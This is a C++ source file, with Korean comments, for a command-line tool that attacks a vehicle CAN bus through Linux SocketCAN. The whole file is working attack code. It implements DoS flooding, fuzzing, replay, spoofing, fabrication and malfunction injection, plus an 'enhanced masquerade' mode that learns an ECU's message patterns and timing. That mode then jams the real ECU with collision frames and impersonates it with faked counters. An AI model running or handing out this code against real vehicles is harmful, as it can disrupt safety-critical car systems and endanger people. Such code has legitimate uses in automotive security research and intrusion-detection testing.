// COMPILE WITH c++17
// g++ -o CAN_attacker CAN_attacker.cpp -std=c++17 -pthread

#include <iostream>
#include <chrono>
#include <thread>
#include <vector>
#include <random>
#include <map>
#include <deque>
#include <functional>
#include <linux/can.h>
#include <linux/can/raw.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include <unistd.h>
#include <algorithm>
#include <atomic>
#include <csignal>
#include <iomanip>
#include <numeric>
#include <cstring>
#include <sstream>
#include <sys/select.h>

enum class AttackFrequency {
    HIGH,       // 10-50ms
    MEDIUM,     // 100-500ms
    LOW,        // 1-5s
    ADAPTIVE    // Dynamically adjusts based on target CAN ID
};

struct CANFrame {
    canid_t id;
    uint8_t dlc;
    uint8_t data[8];
};

volatile sig_atomic_t running = 1;

void signalHandler(int signum) {
    std::cout << "\nInterrupt signal (" << signum << ") received. Shutting down...\n";
    running = 0;
}

class CANMessageAttacker {
private:
    int socket_fd;
    struct sockaddr_can addr;
    struct ifreq ifr;
    std::mt19937 rng{std::random_device{}()};
    std::map<canid_t, std::deque<std::chrono::steady_clock::time_point>> traffic_timings;
    const size_t sample_size = 20;
    std::vector<CANFrame> recorded_frames;

    const std::map<AttackFrequency, std::pair<int, int>> frequency_ranges = {
        {AttackFrequency::HIGH, {10, 50}},
        {AttackFrequency::MEDIUM, {100, 500}},
        {AttackFrequency::LOW, {1000, 5000}}
    };
    
    // 패턴 학습을 위한 추가 변수들
    struct MessagePattern {
        std::vector<std::vector<uint8_t>> data_patterns;  // 관찰된 데이터 패턴
        std::vector<uint64_t> timing_patterns;  // 메시지 간 시간 간격 (마이크로초)
        std::map<std::vector<uint8_t>, size_t> pattern_frequency;  // 각 패턴의 빈도
    };
    
    std::map<canid_t, MessagePattern> learned_patterns;
    std::map<canid_t, std::chrono::steady_clock::time_point> last_original_message_time;
    std::map<canid_t, bool> is_original_ecu_active;

    void logMessage(const std::string& level, const std::string& message) {
        auto now = std::chrono::system_clock::now();
        auto now_time = std::chrono::system_clock::to_time_t(now);
        std::cout << "[" << std::put_time(std::localtime(&now_time), "%Y-%m-%d %H:%M:%S") << "] "
                  << "[" << level << "] " << message << std::endl;
    }

    bool initializeSocket(const std::string& ifname) {
        if ((socket_fd = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0) {
            logMessage("ERROR", "Socket creation failed");
            return false;
        }

        strcpy(ifr.ifr_name, ifname.c_str());
        if (ioctl(socket_fd, SIOCGIFINDEX, &ifr) < 0) {
            logMessage("ERROR", "Failed to retrieve interface index");
            close(socket_fd);
            return false;
        }

        addr.can_family = AF_CAN;
        addr.can_ifindex = ifr.ifr_ifindex;

        if (bind(socket_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            logMessage("ERROR", "Bind failed");
            close(socket_fd);
            return false;
        }

        logMessage("INFO", "Socket initialized successfully on " + ifname);
        return true;
    }

    int calculateAdaptiveInterval(canid_t target_id) {
        if (traffic_timings[target_id].size() < 2) {
            return 1000; // Default interval if insufficient data
        }
        auto& timestamps = traffic_timings[target_id];
        std::vector<int> intervals;
        intervals.reserve(timestamps.size() - 1);
        
        for (size_t i = 1; i < timestamps.size(); i++) {
            auto interval = std::chrono::duration_cast<std::chrono::milliseconds>(
                timestamps[i] - timestamps[i-1]).count();
            intervals.push_back(static_cast<int>(interval));
        }
        return std::accumulate(intervals.begin(), intervals.end(), 0) / 
               static_cast<int>(intervals.size());
    }

    int getInterval(AttackFrequency freq, canid_t target_id = 0, const std::string& attack_type = "") {
        if (freq == AttackFrequency::ADAPTIVE) {
            return calculateAdaptiveInterval(target_id);
        }
        
        auto it = frequency_ranges.find(freq);
        if (it == frequency_ranges.end()) {
            logMessage("ERROR", "Invalid frequency range requested");
            return 100;
        }
        
        auto [min_ms, max_ms] = it->second;
        std::uniform_int_distribution<> dist(min_ms, max_ms);
        return dist(rng);
    }

    bool sendFrame(const CANFrame& frame) {
        struct can_frame can_frame;
        can_frame.can_id = frame.id;
        can_frame.can_dlc = frame.dlc;
        memcpy(can_frame.data, frame.data, frame.dlc);

        ssize_t bytes_written = write(socket_fd, &can_frame, sizeof(struct can_frame));
        return bytes_written == sizeof(struct can_frame);
    }

    CANFrame generateRandomFrame(canid_t target_id = 0) {
        CANFrame frame;
        frame.id = (target_id == 0) ? 
                std::uniform_int_distribution<>(0, 0x7FF)(rng) : target_id;
        
        frame.dlc = std::uniform_int_distribution<>(1, 8)(rng);
        for (int i = 0; i < frame.dlc; i++) {
            frame.data[i] = std::uniform_int_distribution<>(0, 0xFF)(rng);
        }
        return frame;
    }
    
    // 원본 ECU 메시지 학습
    void learnECUPatterns(canid_t target_id, size_t sample_count) {
        std::stringstream ss;
        ss << "Learning ECU patterns for ID: 0x" << std::hex << target_id;
        logMessage("INFO", ss.str());
        
        learned_patterns[target_id] = MessagePattern();
        auto& pattern = learned_patterns[target_id];
        
        struct can_frame frame;
        size_t samples = 0;
        std::chrono::steady_clock::time_point last_time;
        bool first_message = true;
        
        // 지정된 샘플 수만큼 메시지 수집
        while(running && samples < sample_count) {
            ssize_t bytes_read = read(socket_fd, &frame, sizeof(struct can_frame));
            
            if(bytes_read == sizeof(struct can_frame) && frame.can_id == target_id) {
                auto current_time = std::chrono::steady_clock::now();
                
                // 데이터 패턴 저장
                std::vector<uint8_t> data_pattern(frame.data, frame.data + frame.can_dlc);
                pattern.data_patterns.push_back(data_pattern);
                
                // 패턴 빈도 계산
                pattern.pattern_frequency[data_pattern]++;
                
                // 타이밍 패턴 저장
                if (!first_message) {
                    auto interval = std::chrono::duration_cast<std::chrono::microseconds>(
                        current_time - last_time).count();
                    pattern.timing_patterns.push_back(interval);
                } else {
                    first_message = false;
                }
                
                last_time = current_time;
                last_original_message_time[target_id] = current_time;
                is_original_ecu_active[target_id] = true;
                samples++;
                
                if (samples % 10 == 0) {
                    std::stringstream progress;
                    progress << "Collected " << samples << " samples for ID: 0x" << std::hex << target_id;
                    logMessage("INFO", progress.str());
                }
            }
        }
        
        logMessage("INFO", "Pattern learning completed. " + 
                  std::to_string(pattern.data_patterns.size()) + " samples collected.");
        
        // 패턴 분석 결과 로깅
        analyzePatterns(target_id);
    }
    
    // 수집된 패턴 분석
    void analyzePatterns(canid_t target_id) {
        if (learned_patterns.find(target_id) == learned_patterns.end()) {
            std::stringstream ss;
            ss << "No patterns learned for ID: 0x" << std::hex << target_id;
            logMessage("ERROR", ss.str());
            return;
        }
        
        auto& pattern = learned_patterns[target_id];
        
        // 가장 빈번한 데이터 패턴 찾기
        std::vector<uint8_t> most_common_pattern;
        size_t max_freq = 0;
        for (const auto& [data, freq] : pattern.pattern_frequency) {
            if (freq > max_freq) {
                max_freq = freq;
                most_common_pattern = data;
            }
        }
        
        // 평균 시간 간격 계산
        double avg_interval = 0;
        if (!pattern.timing_patterns.empty()) {
            avg_interval = std::accumulate(pattern.timing_patterns.begin(), 
                                          pattern.timing_patterns.end(), 0.0) / 
                          pattern.timing_patterns.size();
        }
        
        // 결과 로깅
        std::stringstream ss;
        ss << "Pattern Analysis for ID 0x" << std::hex << target_id << ":\n";
        ss << "- Unique data patterns: " << pattern.pattern_frequency.size() << "\n";
        ss << "- Most common pattern (appeared " << max_freq << " times): ";
        
        if (!most_common_pattern.empty()) {
            for (uint8_t byte : most_common_pattern) {
                ss << std::hex << std::setw(2) << std::setfill('0') << (int)byte << " ";
            }
        }
        
        ss << "\n- Average message interval: " << std::fixed << std::setprecision(2) 
           << avg_interval / 1000.0 << " ms";
        
        logMessage("INFO", ss.str());
    }
    
    // 원본 ECU가 여전히 활성 상태인지 확인
    void monitorOriginalECU(canid_t target_id) {
        if (is_original_ecu_active.find(target_id) == is_original_ecu_active.end()) {
            is_original_ecu_active[target_id] = false;
            return;
        }
        
        auto now = std::chrono::steady_clock::now();
        if (last_original_message_time.find(target_id) != last_original_message_time.end()) {
            // 타임아웃 체크 (예: 2초 동안 원본 메시지 없음)
            auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
                now - last_original_message_time[target_id]).count();
            
            if (elapsed > 2000) {  // 2초 타임아웃
                is_original_ecu_active[target_id] = false;
            }
        }
    }
    
    // 원본 ECU 메시지 모니터링 (별도 스레드에서 실행)
    void monitorMessages(canid_t target_id) {
        struct can_frame frame;
        
        while(running) {
            struct timeval timeout;
            timeout.tv_sec = 0;
            timeout.tv_usec = 100000;  // 100ms 타임아웃
            
            fd_set read_fds;
            FD_ZERO(&read_fds);
            FD_SET(socket_fd, &read_fds);
            
            int ret = select(socket_fd + 1, &read_fds, NULL, NULL, &timeout);
            
            if (ret > 0 && FD_ISSET(socket_fd, &read_fds)) {
                ssize_t bytes_read = read(socket_fd, &frame, sizeof(struct can_frame));
                
                if (bytes_read == sizeof(struct can_frame) && frame.can_id == target_id) {
                    last_original_message_time[target_id] = std::chrono::steady_clock::now();
                    is_original_ecu_active[target_id] = true;
                    
                    // 원본 메시지가 감지될 때마다 로그
                    std::stringstream ss;
                    ss << "Original ECU message detected for ID: 0x" << std::hex << target_id;
                    logMessage("DEBUG", ss.str());
                }
            } else {
                // 주기적으로 활성 상태 체크
                monitorOriginalECU(target_id);
            }
        }
    }
    
    // 다음 패턴을 선택 (패턴 시퀀스 모방)
    std::vector<uint8_t> selectNextPattern(canid_t target_id) {
        if (learned_patterns.find(target_id) == learned_patterns.end() || 
            learned_patterns[target_id].data_patterns.empty()) {
            // 학습된 패턴이 없으면 0xAA로 채운 기본 패턴 반환
            std::vector<uint8_t> default_pattern(8, 0xAA);
            return default_pattern;
        }
        
        // 패턴 주기성을 모방하기 위해 인덱스 계산
        static std::map<canid_t, size_t> pattern_indices;
        
        if (pattern_indices.find(target_id) == pattern_indices.end()) {
            pattern_indices[target_id] = 0;
        } else {
            pattern_indices[target_id] = (pattern_indices[target_id] + 1) % 
                                        learned_patterns[target_id].data_patterns.size();
        }
        
        return learned_patterns[target_id].data_patterns[pattern_indices[target_id]];
    }
    
    // 다음 타이밍 간격을 선택
    uint64_t selectNextInterval(canid_t target_id) {
        if (learned_patterns.find(target_id) == learned_patterns.end() || 
            learned_patterns[target_id].timing_patterns.empty()) {
            return 10000;  // 기본값: 10ms
        }
        
        // 타이밍 주기성을 모방하기 위해 인덱스 계산
        static std::map<canid_t, size_t> timing_indices;
        
        if (timing_indices.find(target_id) == timing_indices.end()) {
            timing_indices[target_id] = 0;
        } else {
            timing_indices[target_id] = (timing_indices[target_id] + 1) % 
                                       learned_patterns[target_id].timing_patterns.size();
        }
        
        return learned_patterns[target_id].timing_patterns[timing_indices[target_id]];
    }
    
    // 재현 가능한 랜덤 변화 추가 (실제 ECU 메시지는 약간의 변화가 있음)
    void addVariation(std::vector<uint8_t>& data, canid_t target_id) {
        // 타겟 ID의 시드 생성 (동일 ID에 대해 일관된 변형 패턴 생성)
        unsigned seed = target_id;
        std::mt19937 gen(seed);
        
        // 일부 바이트에만 작은 변화 주기 (예: 카운터, 체크섬 등)
        for (size_t i = 0; i < data.size(); i++) {
            // 마지막 바이트에 카운터 시뮬레이션
            if (i == data.size() - 1 && std::uniform_real_distribution<>(0, 1)(gen) < 0.8) {
                static std::map<canid_t, uint8_t> counters;
                if (counters.find(target_id) == counters.end()) {
                    counters[target_id] = 0;
                }
                data[i] = counters[target_id]++;
            }
            // 다른 바이트에는 간헐적으로 작은 변화만
            else if (std::uniform_real_distribution<>(0, 1)(gen) < 0.1) {
                // 0-3 사이의 작은 변화만 적용
                int8_t variation = std::uniform_int_distribution<>(-1, 1)(gen);
                data[i] = (data[i] + variation) & 0xFF;
            }
        }
    }

public:
    explicit CANMessageAttacker(const std::string& interface = "can0") {
        if (!initializeSocket(interface)) {
            throw std::runtime_error("Failed to initialize CAN socket");
        }
    }

    ~CANMessageAttacker() {
        close(socket_fd);
    }

    void dosAttack(AttackFrequency freq, canid_t target_id) {
        logMessage("INFO", "Starting DoS attack");
        CANFrame frame;
        frame.id = target_id;
        frame.dlc = 8;
        memset(frame.data, 0x00, 8);

        while (running) {
            if (!sendFrame(frame)) {
                logMessage("ERROR", "Failed to send frame");
                break;
            }
            std::this_thread::sleep_for(
                std::chrono::milliseconds(getInterval(freq, target_id, "dos")));
        }
        logMessage("INFO", "DoS attack stopped");
    }

    void fuzzingAttack(AttackFrequency freq, canid_t target_id) {
        logMessage("INFO", "Starting FUZZING attack");
        while (running) {
            if (!sendFrame(generateRandomFrame(target_id))) {
                logMessage("ERROR", "Failed to send frame");
                break;
            }
            std::this_thread::sleep_for(
                std::chrono::milliseconds(getInterval(freq, target_id, "fuzzing")));
        }
        logMessage("INFO", "FUZZING attack stopped");
    }

    void replayAttack(AttackFrequency freq, canid_t target_id) {
        logMessage("INFO", "Starting REPLAY attack");
        if (recorded_frames.empty()) {
            logMessage("ERROR", "No recorded frames to replay");
            return;
        }

        while (running) {
            for (const auto& frame : recorded_frames) {
                if (!running) break;
                if (!sendFrame(frame)) {
                    logMessage("ERROR", "Failed to send frame");
                    return;
                }
                std::this_thread::sleep_for(
                    std::chrono::milliseconds(getInterval(freq, target_id, "replay")));
            }
        }
        logMessage("INFO", "REPLAY attack stopped");
    }

    void fabricationAttack(canid_t target_id) {
        logMessage("INFO", "Starting FABRICATION attack");
        while (running) {
            CANFrame frame = generateRandomFrame(target_id);
            if (!sendFrame(frame)) {
                logMessage("ERROR", "Failed to send frame");
                break;
            }
        }
        logMessage("INFO", "FABRICATION attack stopped");
    }

    void malfunctionAttack(canid_t target_id) {
        logMessage("INFO", "Starting MALFUNCTION attack");
        CANFrame frame;
        frame.id = target_id;
        frame.dlc = 8;
        memset(frame.data, 0xFF, 8);

        // 타겟 ID의 메시지 타이밍을 수집
        struct can_frame recv_frame;
        size_t samples = 0;
        
        logMessage("INFO", "Collecting timing samples for target ID");
        while(running && samples < sample_size) {  // sample_size는 이미 클래스에 정의된 값(20) 사용
            ssize_t bytes_read = read(socket_fd, &recv_frame, sizeof(struct can_frame));
            if(bytes_read == sizeof(struct can_frame) && recv_frame.can_id == target_id) {
                traffic_timings[target_id].push_back(std::chrono::steady_clock::now());
                samples++;
            }
        }

        int interval = calculateAdaptiveInterval(target_id);
        logMessage("INFO", "Target interval calculated: " + std::to_string(interval) + " ms");

        // 계산된 간격으로 공격 실행
        while (running) {
            if (!sendFrame(frame)) {
                logMessage("ERROR", "Failed to send frame");
                break;
            }
            std::this_thread::sleep_for(std::chrono::microseconds(interval * 1000));  // ms를 microseconds로 변환
        }
        
        logMessage("INFO", "MALFUNCTION attack stopped");
    }

    void spoofingAttack(canid_t target_id) {
        logMessage("INFO", "Starting SPOOFING attack");
        CANFrame frame;
        frame.id = target_id;
        frame.dlc = 8;
        memset(frame.data, 0x01, 8);

        while (running) {
            if (!sendFrame(frame)) {
                logMessage("ERROR", "Failed to send frame");
                break;
            }
        }
        logMessage("INFO", "SPOOFING attack stopped");
    }

    void masqueradeAttack(canid_t target_id) {
        logMessage("INFO", "Starting MASQUERADE attack");
        CANFrame frame;
        frame.id = target_id;
        frame.dlc = 8;
        memset(frame.data, 0xAA, 8);

        while (running) {
            if (!sendFrame(frame)) {
                logMessage("ERROR", "Failed to send frame");
                break;
            }
        }
        logMessage("INFO", "MASQUERADE attack stopped");
    }
    
    // 향상된 마스커레이드 공격
    void enhancedMasqueradeAttack(canid_t target_id, size_t learning_samples = 100) {
        std::stringstream ss;
        ss << "Starting ENHANCED MASQUERADE attack for ID: 0x" << std::hex << target_id;
        logMessage("INFO", ss.str());
        
        // ECU 패턴 학습
        learnECUPatterns(target_id, learning_samples);
        
        // 원본 ECU 모니터링을 위한 별도 스레드 시작
        std::thread monitor_thread(&CANMessageAttacker::monitorMessages, this, target_id);
        monitor_thread.detach();  // 백그라운드로 실행
        
        // 원본 ECU 방해를 위한 프레임 준비
        CANFrame block_frame;
        block_frame.id = target_id;
        block_frame.dlc = 8;
        memset(block_frame.data, 0xFF, 8);  // 충돌 유발을 위한 값
        
        // 위장 메시지 전송
        while (running) {
            // 원본 ECU가 활성화되어 있는지 확인
            if (is_original_ecu_active[target_id]) {
                // 원본 ECU가 활성화되어 있으면 충돌 메시지로 방해
                std::stringstream debug_ss;
                debug_ss << "Attempting to block original ECU for ID: 0x" << std::hex << target_id;
                logMessage("DEBUG", debug_ss.str());
                
                // 높은 우선순위와 빠른 속도로 충돌 메시지 전송
                for (int i = 0; i < 10 && running; i++) {
                    if (!sendFrame(block_frame)) {
                        logMessage("ERROR", "Failed to send blocking frame");
                        break;
                    }
                    std::this_thread::sleep_for(std::chrono::microseconds(500));
                }
            }
            
            // 다음 패턴 선택
            std::vector<uint8_t> next_pattern = selectNextPattern(target_id);
            
            // 실제 ECU처럼 보이기 위한 약간의 변화 추가
            addVariation(next_pattern, target_id);
            
            // 패턴을 이용한 프레임 생성
            CANFrame frame;
            frame.id = target_id;
            frame.dlc = std::min(8, static_cast<int>(next_pattern.size()));
            memcpy(frame.data, next_pattern.data(), frame.dlc);
            
            // 프레임 전송
            if (!sendFrame(frame)) {
                logMessage("ERROR", "Failed to send masquerade frame");
                break;
            }
            
            // 학습된 타이밍에 따라 대기
            uint64_t next_interval = selectNextInterval(target_id);
            std::this_thread::sleep_for(std::chrono::microseconds(next_interval));
        }
        
        logMessage("INFO", "ENHANCED MASQUERADE attack stopped");
    }

    void startRecording(size_t frame_count) {
        recorded_frames.clear();
        recorded_frames.reserve(frame_count);
        
        struct can_frame frame;
        logMessage("INFO", "Starting frame recording");
        
        for (size_t i = 0; i < frame_count && running; ++i) {
            ssize_t bytes_read = read(socket_fd, &frame, sizeof(struct can_frame));
            if (bytes_read == sizeof(struct can_frame)) {
                CANFrame recorded_frame;
                recorded_frame.id = frame.can_id;
                recorded_frame.dlc = frame.can_dlc;
                memcpy(recorded_frame.data, frame.data, frame.can_dlc);
                recorded_frames.push_back(recorded_frame);
            }
        }
        
        logMessage("INFO", "Recording completed. Frames recorded: " + 
                  std::to_string(recorded_frames.size()));
    }
};

int main(int argc, char** argv) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <attack_type> [frequency] [can_id]\n";
        std::cerr << "Attack types: dos, fuzzing, replay, fabrication, malfunction, spoofing, masquerade, enhanced_masquerade\n";
        std::cerr << "Frequencies (only for dos, fuzzing, replay): high, medium, low, adaptive\n";
        std::cerr << "  Note: adaptive frequency not recommended for dos or fuzzing attacks\n";
        std::cerr << "CAN ID: hexadecimal value (e.g., 0x123)\n";
        std::cerr << "Note: malfunction, spoofing, masquerade, fabrication, enhanced_masquerade attacks require only CAN ID\n";
        return 1;
    }

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = signalHandler;
    sigaction(SIGINT, &sa, nullptr);

    try {
        std::string attack_type = argv[1];
        canid_t target_id = 0;
        
        // enhanced_masquerade 공격 처리
        if (attack_type == "enhanced_masquerade") {
            if (argc != 3) {
                throw std::invalid_argument("Usage: " + std::string(argv[0]) + " " + 
                                          attack_type + " <can_id>");
            }
            target_id = std::stoul(argv[2], nullptr, 16);
            CANMessageAttacker attacker("can0");
            
            // 기본적으로 100개 샘플로 패턴 학습
            attacker.enhancedMasqueradeAttack(target_id, 100);
            return 0;
        }

        // frequency가 필요없는 공격 먼저 처리
        if (attack_type == "malfunction" || attack_type == "spoofing" || 
            attack_type == "masquerade" || attack_type == "fabrication") {
            if (argc != 3) {
                throw std::invalid_argument("Usage: " + std::string(argv[0]) + " " + 
                                          attack_type + " <can_id>");
            }
            target_id = std::stoul(argv[2], nullptr, 16);
            CANMessageAttacker attacker("can0");

            if (attack_type == "malfunction") attacker.malfunctionAttack(target_id);
            else if (attack_type == "spoofing") attacker.spoofingAttack(target_id);
            else if (attack_type == "masquerade") attacker.masqueradeAttack(target_id);
            else attacker.fabricationAttack(target_id);
            return 0;
        }

        // frequency가 필요한 공격 처리
        if (argc < 3) {
            throw std::invalid_argument("Not enough arguments for selected attack type");
        }

        std::string freq_str = argv[2];
        AttackFrequency freq;
        
        // DOS나 퍼징 공격에서 adaptive 빈도 선택 시 재입력 요청
        if (freq_str == "adaptive" && (attack_type == "dos" || attack_type == "fuzzing")) {
            std::cerr << "WARNING: " << attack_type << " attack does not benefit from adaptive timing.\n";
            std::cerr << "Please choose a different frequency (high, medium, low): ";
            std::cin >> freq_str;
            
            // 잘못된 입력 처리
            while (freq_str != "high" && freq_str != "medium" && freq_str != "low") {
                std::cerr << "Invalid frequency. Please enter 'high', 'medium', or 'low': ";
                std::cin >> freq_str;
            }
        }
        
        if (freq_str == "high") freq = AttackFrequency::HIGH;
        else if (freq_str == "medium") freq = AttackFrequency::MEDIUM;
        else if (freq_str == "low") freq = AttackFrequency::LOW;
        else if (freq_str == "adaptive") freq = AttackFrequency::ADAPTIVE;
        else throw std::invalid_argument("Invalid frequency level");

        if (argc == 4) {
            target_id = std::stoul(argv[3], nullptr, 16);
        }

        CANMessageAttacker attacker("can0");

        if (attack_type == "replay") {
            attacker.startRecording(20);
        }

        if (attack_type == "dos") attacker.dosAttack(freq, target_id);
        else if (attack_type == "fuzzing") attacker.fuzzingAttack(freq, target_id);
        else if (attack_type == "replay") attacker.replayAttack(freq, target_id);
        else throw std::invalid_argument("Unknown attack type");

    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << "\n";
        return 1;
    }

    std::cout << "Program terminated cleanly\n";
    return 0;
}